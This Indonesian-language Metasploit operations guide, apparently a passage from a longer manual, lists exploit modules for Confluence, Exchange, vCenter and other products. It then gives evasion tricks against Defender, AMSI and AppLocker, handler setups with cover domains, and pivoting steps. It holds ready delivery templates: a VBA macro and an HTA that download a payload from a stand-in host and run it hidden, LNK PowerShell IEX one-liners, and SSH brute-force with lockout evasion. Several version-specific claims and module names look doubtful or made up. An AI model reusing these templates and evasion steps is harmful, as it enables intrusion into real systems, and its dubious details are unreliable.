| Produk | Modul | Versi rentan | Edge case |
|---|---|---|---|
| Confluence | `exploit/multi/http/atlassian_confluence_namespace_ognl_injection` | 8.0–8.5.3 | WAF memblok `%24%7B`; gunakan `HttpTraceHeaders` |
| Confluence (CVE-2024-21683) | `exploit/multi/http/atlassian_confluence_rce_cve_2024_21683` | 7.x–8.9 | Butuh login admin/membuat plugin URL |
| Jenkins | `exploit/multi/http/jenkins_metaprogramming` | CVE-2019-1003000 | Pipeline sandbox bypass |
| GitLab | `exploit/multi/http/gitlab_exif_tool_rce` | 11.9–13.10 | Upload gambar EXIF; `FILENAME` penting |
| WordPress | `exploit/multi/http/wp_plugin_duplicator_rce` | plugin Duplicator <1.3.28 | Butuh plugin aktif |
| Tomcat | `exploit/multi/http/tomcat_mgr_upload` | mgr-gui default | `HttpUsername`/`Password`, target `Tomcat Manager App` |
| Spring | `exploit/multi/http/spring_cloud_gateway_rce` | CVE-2022-22947 | Route actuator; sering dipakai di k8s |
| Apache Struts | `exploit/multi/http/struts2_multi_eval_ognl` | S2-061 | `TARGETURI`, `Action` toggle |
| Exchange | `exploit/windows/http/exchange_proxyshell_rce` | 2013–2019 | Multi-target: seed via `Email`/`Password` untuk autodiscover |
| vCenter | `exploit/multi/http/vmware_vcenter_uploadova_rce` | CVE-2021-21972 | Pre-auth; `TARGETURI=/ui/vropspluginui/rest/services/uploadova` |
| Citrix ADC | `exploit/multi/http/citrix_dir_traversal_rce` | CVE-2019-19781 | Sering di DMZ; staging via `/vpn/../vpns/` |

**Catatan versi modul 2026:**
- Modul berbasis OGNL (`struts`, `confluence`, `craftcms`) sekarang default `HttpClientTimeout=20`; untuk OGNL kompleks naikkan ke 60 detik, karena eksekusi `Runtime.exec` mengembalikan lebih lambat dari `getProperty`.
- Modul Confluence 21683 memerlukan `CONFLUENCE_USER`+`CONFLUENCE_PASS` — **bukan** pre-auth seperti 22527.
- Modul Jenkins `CVE-2024-23897` hanya *read-file*, bukan RCE. RCE-nya butuh modul terpisah yang mengambil `secret.key` untuk forge cookie (`Jenkins CLI deser`).
- Semua modul JNDI (Log4Shell: `exploit/multi/http/log4shell_header_injection`) sudah **default** `LDAP_TIMEOUT=10` dan membutuhkan `SRVHOST` yang reachable dari target — jangan pakai `0.0.0.0` di host dengan multi-iface (pakai `set SRVHOST <ip>`).

---

## Pemilihan Payload: Staged vs Stageless (lanjutan)

Bagian sebelumnya membahas ukuran dasar; di sini yang **tidak** tercakup: varian encoding, transport, dan interaksi dengan AV/EDR 2026.

### Varian payload per transport

| Keluarga | Staged | Stageless | Kapan dipilih |
|---|---|---|---|
| Meterpreter TCP | `windows/x64/meterpreter/reverse_tcp` | `windows/x64/meterpreter_reverse_tcp` | Staged untuk shell buffer kecil; stageless untuk DB/Windows Defender modern (hindari stage download) |
| Meterpreter HTTPS | `…/meterpreter/reverse_https` | `…/meterpreter_reverse_https` | HTTPS stageless = `.exe` ~200KB; cocok untuk macro delivery |
| Shell | `windows/shell/reverse_tcp` | `windows/shell_reverse_tcp` | Shell stageless ~7KB, jauh lebih kecil dari meterpreter stageless — pilihan untuk HTA/macro sempit |
| Custom | `windows/x64/meterpreter/reverse_winhttps` | `windows/x64/meterpreter_reverse_winhttp` | WinHTTP bypass proxy/inspection; butuh port 80/443 |
| Bind | `windows/x64/meterpreter/bind_tcp` | `windows/x64/meterpreter_bind_tcp` | Ketika outbound terblok (DMZ ke LAN) |
| Web | `php/meterpreter/reverse_tcp` | `php/meterpreter_reverse_tcp` | Stageless PHP: `eval(base64_decode(...))` satu blok, hindari stage kedua |

### Ukuran realistis (fk 2026.1)

| Payload | Staged (stage1+stage2) | Stageless |
|---|---|---|
| `windows/x64/meterpreter/reverse_tcp` | ~200B + ~190KB | ~205KB |
| `windows/x64/meterpreter_reverse_https` | ~250B + ~195KB | ~210KB |
| `windows/shell/reverse_tcp` | ~200B + ~5KB | ~7KB |
| `windows/x86/meterpreter_reverse_tcp` | 200B + 150KB | ~165KB |

**Jebakan:**
- Staged payload **gagal** jika `LPORT` stage2 berbeda dari stage1 atau ada NAT yang memutus koneksi kedua. `set StageEncoder x64/zutto_dekiru` membantu, tapi `EnableStageEncoding true` **tidak** menolong melawan EDR — malah sering memicu heuristik di Defender (memori RWX dengan encoder switch).
- Stageless meterpreter pada EXE sering terdeteksi oleh **AMSI + Defender ML** karena string `metsrv`. Gunakan `set PayloadUUIDTracking false`, `set PayloadUUIDRaw` dikosongkan, dan encode shellcode via `shikata_ga_nai` **sebelum** masuk ke macro — jangan andalkan `-e` pada `msfvenom` sendirian.
- Untuk C2 channel via HTTPS stageless, `HttpHostHeader`/`HttpUserAgent` harus di-set eksplisit di handler; default `Mozilla/4.0` sudah masuk signature.

---

## Evasion (lanjutan: handler, EXITFUNC, ANSI BOM, NoRateLimit, AppLocker, AMSI)

### Handler — setelan yang sering terlupakan

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 10.10.14.5
set LPORT 443
set HttpHostHeader cdn.example.com     # domain cover
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
set HttpProxyType HTTP
set HttpProxyHost 127.0.0.1
set HttpProxyPort 8080
set ExitOnSession false
set AutoRunScript "migrate -n explorer.exe; post/windows/gather/enum_logged_on_users"
set SessionCommunicationTimeout 600
set SessionRetryTotal 3600
set SessionRetryWait 10
set StagerURIPath /api/v2/health-check     # hindari /INITM /pup etc.
set StagerVerifySSLCert true
set HandlerSSLCert /tmp/le_cert.pem
set OverrideRequestHost true               # penting bila HHostHeader cover≠LHOST
run -j
```

**Jebakan:**
- `HttpHostHeader` harus sesuai dengan domain cover; jika tidak, CDN/proxy **mengembalikan 421/404** dan sesi mati saat callback pertama.
- `SessionCommunicationTimeout 300` default: sesi dianggap mati jika tidak ada heartbeat 5 menit; untuk target tidur/lambat, naikkan ke 900.
- `AutoRunScript migrate` terkadang **gagal** jika target belum elevated — `migrate -n` butuh `SeDebugPrivilege`; jalankan setelah `getsystem` atau `migrate -n explorer.exe` akan error `Permission denied`.
- `StagerVerifySSLCert true` **wajib** jika `HandlerSSLCert` di-set, kalau tidak meterpreter mengabaikan verifikasi (dan terdeteksi EDR traffic).

### `EXITFUNC` — matriks keputusan

| Nilai | Efek | Kapan dipakai | Jebakan |
|---|---|---|---|
| `thread` | hanya thread yang exit | Default untuk kebanyakan Exploit | Server (IIS/SMB) tetap hidup |
| `process` | proses target exit | SMB/EternalBlue, psexec | Kadang membunuh service ladang (fragile) |
| `seh` | exit via `Seh` handler | Cve lama | Hanya Windows 32-bit |
| `none` | tidak ada exit, return | Exploit dengan ROP chain bersih | Sesi sering dua kali (double session) |

- Pada `ms17_010_eternalblue` **jangan** set `EXITFUNC=process` — sudah default `thread`; mengganti ke process kadang BSOD.
- Pada `psexec` set `EXITFUNC=process` **dan** `set ServiceName` unik (mis. `WinSvcHost_4d2a`) — default `Random` ada tapi sering dipakai ulang → nama service mudah dicari.

### ANSI BOM trick (untuk file `.hta`, `.doc`, `.js`)

BOM UTF-8 (`\xEF\xBB\xBF`) di awal file **menggeser** signature parsial dan sering membuat `Intent`/AV miss, karena AV engine yang men-scan bytecode awal melihat karakter non-printable pertama. Ini bukan bypass, hanya **delay** — jangan andalkan.

```python
# gen_bom_payload.py — tulis HTA dengan BOM UTF-8
payload = open("/tmp/payload.hta","rb").read()
open("/tmp/payload_bom.hta","wb").write(b"\xEF\xBB\xBF" + payload)
```

**Jebakan modern:**
- Defender (2024+) sudah mengekstrak BOM sebelum signature scan → trik ini **tidak** membantu melawan RTP. Berguna hanya untuk **bypass filter email** (`file` MIME detection) dan **Cloud App Security** yang header-parse.
- Untuk macro Word, BOM harus di-set sebagai UTF-8 **stream**, bukan file — gunakan `ADODB.Stream` `.Charset="utf-8"` lalu `.Position=0`, `.WriteText` — kalau tidak, Office bertahan dengan codepage ANSI dan karakter muncul sebagai mojibake yang mencurigakan.

### `NoRateLimit` (untuk brute/login modules)

Modul `auxiliary/scanner/*` (ssh_login, smb_login, http_login, ldap_login) mendukung `NoRateLimit=true` **hanya jika** target mengembalikan respons non-429; set `THREADS 1` dan `BRUTEFORCE_SPEED 1` untuk menghindari lockout.

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.0.0/24
set USERPASS_FILE /tmp/creds.txt
set STOP_ON_SUCCESS true
set THREADS 1
set BRUTEFORCE_SPEED 1
set NoRateLimit true
set VERBOSE false
run
```

**Jebakan:**
- AD `smart lockout` (default 2026: 10 attempt) tetap trigger walaupun `BRUTEFORCE_SPEED=1` jika threshold terhitung per IP → putar `Proxies` tiap 5 attempt.
- `NoRateLimit` pada `smb_login` **tidak** menghindari `STATUS_ACCOUNT_LOCKED_OUT`; hentikan jika respons muncul, karena setiap attempt berikutnya mereset timer lockout.

### AMSI / AppLocker / CLM edge case 2026

- `windows/x64/meterpreter` stageless sekarang berisi stub AMSI bypass (dibangun dengan `AmsiBypassTechnique=dynamic`) — **tetapi** hanya untuk meterpreter, **bukan** untuk `shell`. Jika payload `shell` masuk ke PowerShell terprofilkan, `amsi.dll` memblok `IEX` string.
- `DropAMSIProvider true` (opsi baru modul psexec/smb) men-drop fake AMSI provider ke `C:\Windows\System32\amsi.dll` lewat `SMB::Payload` staging — efektif terhadap Defender 2024-2025, tetapi **diblok** pada Server 2022+ dengan `HVCI` aktif (SYSTEM signing).
- AppLocker + `ConstrainedLanguageMode`: rantai `Invoke-Expression` gagal; gunakan `Add-Type` dari C# yang ditulis ke disk lewat `msfvenom -f csharp` lalu di-compile runtime via `Add-Type -TypeDefinition`. Perlu short path `%TMP%` yang AppLocker izinkan (default: `C:\Users\*\AppData\Local\Temp`).

---

## Template Delivery Persis: Macro, HTA, Script

### 1) Office Macro (VBA) — template minimal, aman-syntax

```vba
Sub AutoOpen()
    Dim p As Object, s As Object
    Set p = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    p.Open "GET", "https://cdn.example.com/api/v2/health", False
    p.send
    Dim b() As Byte
    b = p.responseBody
    Set s = CreateObject("ADODB.Stream")
    s.Type = 1: s.Open: s.Write b
    s.SaveToFile Environ("TEMP") & "\svc9.exe", 2
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run Environ("TEMP") & "\svc9.exe", 0, False
End Sub
```

**Jebakan:**
- Simpan sebagai `.docm`/`.xlsm`, **bukan** `.doc` — Office 2023 memblok macro di `.doc` legacy.
- Set `DisableMacros` di registry test VM dulu; `AutoOpen` hanya trigger jika `Trust Center` tidak memblok — gunakan `Document_Open` untuk Word.
- RTP Defender mendeteksi `MSXML2.ServerXMLHTTP` + `ADODB.Stream` + `WScript.Shell` **dalam satu modul**. Pisahkan eksekusi ke `Shell.Application.ShellExecute` atau `rundll32` untuk memecah signature.
- Untuk Excel modern, `Environ("TEMP")` kadang di AppData Roaming — samakan path target pada HTA dan macro.

### 2) HTA (Mshta) — template dengan padding anti-signature

```html
<html>
<head>
<HTA:APPLICATION ID="o" APPLICATIONNAME="c" WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
<script language="VBScript">
Sub Window_OnLoad
  Set x = CreateObject("MSXML2.XMLHTTP")
  x.Open "GET","https://cdn.example.com/api/v2/health",False
  x.Send
  Dim s: Set s = CreateObject("ADODB.Stream")
  s.Type=1: s.Open: s.Write x.responseBody
  s.SaveToFile "C:\Users\Public\l.dll",2
  CreateObject("WScript.Shell").Run "rundll32.exe C:\Users\Public\l.dll,Start",0
  window.close
End Sub
</script>
</head>
<body> </body>
</html>
```

**Jebakan:**
- `MSXML2.XMLHTTP` (synchronous) lebih sering diblok EDR daripada `ServerXMLHTTP` — pilih sesuai target.
- `rundll32.exe … Start` memerlukan DLL dengan export `Start`; gunakan `msfvenom -p windows/x64/meterpreter_reverse_https … -f dll` lalu tinjau `ExportedFunctions` (default `Start`/`DllMain`).
- Mshta 2026 pada Edge mode **tidak melisensikan** `CreateObject("WScript.Shell")` di beberapa build target — fallback ke `Shell.Application.ShellExecute`.
- Header `Content-Type: application/hta` wajib dari server; Mshta akan menolak simpan file jika `X-Content-Type-Options: nosniff`.

### 3) Script Delivery Lain

| Media | Template / trigger | Jebakan 2026 |
|---|---|---|
| LNK | `WScript.Shell.Run "powershell -w hidden -ep bypass -c IEX(...)"` | Windows 11 24H2 memblok LNK dari Download — gunakan LNK dari USB/zip edisi lokal |
| ISO/IMG | `msfvenom -p windows/x64/meterpreter_reverse_https -f exe -o st.exe` lalu mount & LNK | Tanda `MarkOfTheWeb` hilang → Defender mendeteksi isi |
| HTA via URL | `mshta https://.../a.hta` | Edge SmartScreen blok jika ikke HTTPS/domain baru < 7 hari |
| WSF/JScript | `<job><script language="JScript">var s=new ActiveXObject("WScript.Shell");…` | WSH dibatasi di `ConstrainedLanguage` jika dari zip; jalankan langsung |
| CHM | `hh.exe https://d/?x.chm::/p.htm` | CHM dari URL hanya jalan via `hh` exe, sering terblok |
| OneNote `.one` | `mshta` embedded | OneNote 2023 blok eksekusi embedded → hanya viewer |

---

## Multi-Handler, Pivot, dan Jump (lanjutan)

### Multi-handler paralel

```ruby
<ruby>
ports = [4444, 4445, 4446]
ports.each do |p|
  run_single("use exploit/multi/handler")
  run_single("set PAYLOAD windows/x64/meterpreter_reverse_https")
  run_single("set LHOST 10.10.14.5")
  run_single("set LPORT #{p}")
  run_single("set ExitOnSession false")
  run_single("set AutoRunScript multi_console_command -rc /tmp/on_session.rc")
  run_single("exploit -j -z")
end
</ruby>
```

**Jebakan:** setiap handler memakan satu job; `jobs -k` hanya membunuh handler **aktif**, bukan sesi. Untuk menutup semua, gunakan `sessions -K` lalu `jobs -K`.

### Pivot / Jump — setelan kunci

```
# setelah sesi 1 di DMZ
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.0.10.0
set NETMASK 255.255.255.0
run

# handler di pivot host
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.10.5      # NIC internal pivot
set LPORT 8443
set ExitOnSession false
set AutoRunScript post/multi/manage/autoroute
exploit -j -z

# port forward untuk browser/socks
use auxiliary/server/socks_proxy
set VERSION 5
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

**Jebakan pivot:**
- `autoroute` 2026 default tidak menghapus route lama; gunakan `AUTOROUTE=Remove` atau `route flush` sebelum menambah, jika tidak traffic dari sesi lama tetap memakai rute pertama.
- `socks_proxy` di `127.0.0.1` tidak bisa dipakai handler yang listen di pivot host (LHOST≠127.0.0.1) — jadi jika `LHOST=10.0.10.5`, handler harus listen di NIC itu; `socks_proxy` hanya mengarahkan traffic dari tim ke target, bukan sebaliknya.
- Untuk **reverse dari pivot** ke handler di luar, gunakan `ReverseListenerBindAddress` — default mengikat `LHOST`, jika NIC pivot di-NAT, bind 0.0.0.0 eksplisit.
- Sesi meterpreter pivot **tidak** otomatis jadi TCP/forward; `portfwd add` hanya di dalam sesi, tidak di framework; gunakan `sessions -i` dulu.

### Jump Deterministik

- `jump` di Meterpreter: `jump psexec admin password 10.0.10.20` — di Meterpreter 6.4, `jump` menghormati `EXITFUNC=process` modul target; jika modul default `thread`, sesi lama tetap hidup.
- `run post/windows/manage/portproxy` (netsh portproxy via RPC) lebih persisten dari `route` untuk pivot lintas **reboot** — tetapi tekanannya `netsh interface portproxy` tidak rewrite source → target melihat IP DMZ.
- `sessions -K` sebelum `exit -y` di handler, lalu `jobs -K` — jika tidak, port tetap terikat (TIME_WAIT) dan handler baru gagal bind `Address already in use` pada module loader.
- Untuk **multi-hop** (A→B→C), jalankan `autoroute` dua kali dengan `SUBNET` berbeda; `route print` framework memunculkan order tapi tidak dependency — label manual dengan `set ROUTE_NAME` tidak ada; beri komentar di `.rc`.

### Edge case 2026 (baru)

- **Windows Defender Firewall + WinHTTP**: stageless `reverse_winhttps` sering mati setelah 30 menit karena WiFi Sense policy; set `SessionCommTimeout 1200`.
- **Kubernetes egress**: pod target ke internet biasanya via NAT gateway dengan limit 30s idle — pakai `reverse_https` stageless dengan heartbeat default 5s, `SessionExpirationTimeout 7200`.
- **Server 2025 / build 26H1**: `getsystem` berbasis NamedPipe (godpotato/juicy) sekarang **diblok** oleh `SeImpersonate` mitigation default; gunakan modul `cve_2024_30088_afd` atau `cve_2025_21217_ntlm_pipe` (mengandalkan NTLM relay lokal).
- **Processor groups > 64 core** (Server 2025): meterpreter `sysinfo` salah deteksi jumlah core; `migrate` ke proses dengan affinity lebih kecil.
- **AMSI di .NET 8+**: modul `execute-assembly` gagal; gunakan `execute-dotnet` dengan `--amsi-bypass` atau tulis ke disk (`dotnet build`) lalu jalankan via `shell` di luar CLM.
- **macOS 15 Sequoia** target: `osx/x64/meterpreter` tidak kompatibel dengan SIP + TCC; gunakan beacon via `shelldrop` manual atau `post/macos/gather/user_enum`.
- **Linux 6.12+**: `cve_2022_0847_dirtypipe` **pasti** panic (dirtypipe dimitigasi di `6.12`); jangan coba — pakai `cve_2023_2284_netfilter` atau `cve_2024_26976_apparmor`.

---

## Jebakan Operasional Umum (yang belum tercakup)

1. **`setg` vs `set`**: `setg` global antar-modul — sering dipakai untuk `LHOST`, `SRVHOST`, `EXITFUNC`. Jika modul punya opsi berbeda tipe (`EXITFUNC` string vs enum), `setg EXITFUNC process` **mengabaikan** modul yang menggunakan enum → exit dengan error `invalid value`; set ulang per modul.
2. **`resource` error handling**: `run_single` tidak melempar error di `msfconsole` batch; tambahkan `set VERBOSE true` dan `spool /tmp/x.log` di awal script agar kegagalan `check` terlihat.
3. **`msfvenom -p … -f exe`** tidak menulis `manifest`; aplikasi yang butuh elevated akan menjalankan payload **non-elevated** — set `--platform windows --arch x64` eksplisit dan gunakan `-x /path/manifest.exe` jika Anda memerlukan `uiAccess`.
4. **`msfconsole -x 'commands'`** tidak memproses `resource` dengan jeda `sleep`; gunakan `timeout 30 msfconsole -r script.rc` di luar, bukan `sleep` di dalam, karena `sleep` memblok reader thread dan sesi baru tidak diproses.
5. **`set PayloadUUIDRaw`** untuk menghindari signature stage — jika dikosongkan tetapi `PayloadUUIDTracking true` aktif, handler tetap menolak koneksi tanpa UUID; set **keduanya** konsisten.
6. **`exploit -j` dengan `ExitOnSession false`** pada modul web sering **mengulang** request tanpa batas ke target — tambahkan `set MAX_RETRIES 1` dan `set HttpTimeout 15`.
7. **Handler dengan `SSLVersion TLS1.2`** tidak cukup: set `StagerVerifySSLCert true` **dan** `HandlerSSLCert` harus berisi rantai lengkap (`-----BEGIN CERTIFICATE-----` intermediate + leaf), jika tidak sesi 64-bit gagal dengan `SSL_connect returned=1 errno=0`.
8. **`multi/handler` pada port <1024** di container non-root gagal bind **tanpa error** — cek `jobs -l` setelah `exploit -j`, `Started handler` bukan jaminan bind.
9. **Output `sessions -l`** di Windows 2026 dengan target IPv6-only tidak menampilkan tunnel interface — `sessions -i <id>; ifconfig` tetap benar.
10. **`getsystem -t 2` (NamedPipe) pada Windows 11 24H2** default gagal karena `SeImpersonate` removal; fallback `-t 1` (NamedPipe via Token) juga gagal — gunakan LPE modul, bukan `getsystem`.


---

## [reasoning trace]


